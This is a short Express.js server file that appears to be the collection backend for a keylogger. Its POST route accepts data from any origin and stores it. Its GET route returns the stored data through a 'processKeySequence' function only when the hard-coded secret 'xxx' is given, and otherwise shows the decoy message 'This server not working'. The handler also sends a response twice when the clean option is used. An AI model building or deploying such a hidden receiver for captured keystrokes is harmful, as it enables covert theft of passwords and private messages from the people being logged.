const express = require("express");
const cors = require("cors");
const dotenv = require("dotenv");
const compression = require("compression");
const processKeySequence = require("./utils");

dotenv.config();

const app = express();

app.use(cors());
app.use(express.json());
app.use(compression());

let base = [];

app.get("/", (req, res) => {
  const { query } = req;
  if (query.secret == "xxx") {
    if (query.clean == "all") {
      base = [];
      res.json("Cleaned");
    }
    res.json(processKeySequence(base));
  } else {
    res.json("This server not working");
  }
});

app.post("/", (req, res) => {
  base.push(req.body);
  res.json(base);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`Listening on port ${PORT}`));

module.exports = app;
